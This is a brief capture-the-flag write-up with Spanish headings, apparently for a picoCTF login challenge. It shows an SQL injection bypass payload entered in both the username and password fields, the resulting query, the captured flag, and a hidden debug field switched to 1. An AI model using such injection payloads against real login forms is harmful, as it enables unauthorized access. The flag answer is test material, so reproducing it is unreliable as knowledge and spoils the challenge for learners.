
## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

## Solución
```
username: ' or '1'='1
password: ' or '1'='1
SQL query: SELECT * FROM users WHERE name='' or '1'='1' AND password='' or '1'='1'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
y cambias esto por 1:
<input type="hidden" name="debug" value="0">
value por 1
```
## Notas adicionales
## Referencias 
https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/hidden
